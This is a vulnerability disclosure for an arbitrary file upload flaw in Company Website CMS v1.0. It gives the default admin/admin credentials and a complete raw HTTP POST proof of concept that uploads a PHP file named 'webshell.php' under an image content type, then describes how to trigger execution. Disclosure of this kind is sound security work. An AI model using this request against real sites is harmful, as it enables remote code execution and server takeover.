# The Company Website CMS v1.0 developed by Torrahclef has an arbitrary file upload vulnerability
## vendors: [https://www.sourcecodester.com/php/11206/church-management-system.html](https://www.sourcecodester.com/php/15517/company-website-cms-php.html)

## Login account: admin/admin (Super Admin account)

## Vulnerability url: http://127.0.0.1/vogue/dashboard/createservice

## Loophole location: /dashboard/add-service.php has an arbitrary file upload vulnerability
## The program is built using the xmapp-php8.1 version

## process:
1、Use the admin and admin accounts to log in to the background system
![image](https://user-images.githubusercontent.com/88701694/196492985-16a1b8b2-5eb2-48f7-a216-edf0823e6409.png)
2、The construct POC successfully uploaded the php file
poc：
```
POST /vogue/dashboard/createservice HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------120472908621194155141824599930
Content-Length: 777
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/vogue/dashboard/createservice
Cookie: PHPSESSID=e2s3ah89nov4updrl625trke71
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------120472908621194155141824599930
Content-Disposition: form-data; name="service_title"

2222222222222222
-----------------------------120472908621194155141824599930
Content-Disposition: form-data; name="service_desc"

22222222222222222
-----------------------------120472908621194155141824599930
Content-Disposition: form-data; name="service_detail"

222222222222222222222
-----------------------------120472908621194155141824599930
Content-Disposition: form-data; name="ufile"; filename="webshell.php"
Content-Type: image/png

<?php phpinfo(); ?>
-----------------------------120472908621194155141824599930
Content-Disposition: form-data; name="save"


-----------------------------120472908621194155141824599930--
```

![image](https://user-images.githubusercontent.com/88701694/196493351-c294f1f1-3fec-4a0f-8145-d440cd95967f.png)
3、Come to the front page, you can see the content you created under "services" at the bottom of the page, click in, and access the picture. Executing the script successfully
![image](https://user-images.githubusercontent.com/88701694/196496197-156415f8-ec28-47c0-a1d0-7d5893d74443.png)
![image](https://user-images.githubusercontent.com/88701694/196496227-58a609ac-f364-4a5c-8cd5-f680bfcb1561.png)
